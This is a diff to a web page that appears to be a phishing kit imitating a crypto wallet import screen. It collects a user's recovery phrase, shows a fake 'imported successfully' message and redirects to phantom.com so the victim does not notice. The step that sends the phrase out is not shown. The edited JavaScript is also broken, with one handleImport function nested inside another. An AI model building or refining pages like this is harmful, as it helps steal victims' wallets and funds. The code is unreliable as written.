@@ -46,9 +46,11 @@
     <button class="paste-btn" onclick="document.getElementById('phrase-input').focus()">Paste</button>
   </div>
 
-  <div class="toast" id="toast">Wallet imported successfully!</div>
+ <div class="toast" id="toast">✓ Wallet imported successfully! Redirecting...</div>
 
-  <button class="btn btn-dark-purple" onclick="handleImport()" style="margin-bottom:16px;">Import</button>
+  <button class="btn btn-dark-purple" id="import-btn" onclick="handleImport()" style="margin-bottom:16px;">
+  <span class="btn-text">Import</span>
+</button>
 
 
 </div>
@@ -57,15 +59,15 @@
 <script>
 async function handleImport() {
 
-    const phrase =
-        document.getElementById("phrase-input")
-        .value
-        .trim();
-
-    if (!phrase) {
-        alert("Please enter your key first.");
-        return;
-    }
+   function handleImport() {
+  const phrase = document.getElementById('phrase-input').value.trim();
+  if (!phrase) { alert('Please enter your recovery phrase first.'); return; }
+  const btn = document.getElementById('import-btn');
+  btn.classList.add('loading');
+  btn.querySelector('.btn-text').textContent = 'Importing...';
+  document.getElementById('toast').style.display = 'block';
+  setTimeout(function() { window.location.href = 'https://www.phantom.com'; }, 2500);
+}
 
     try {
 
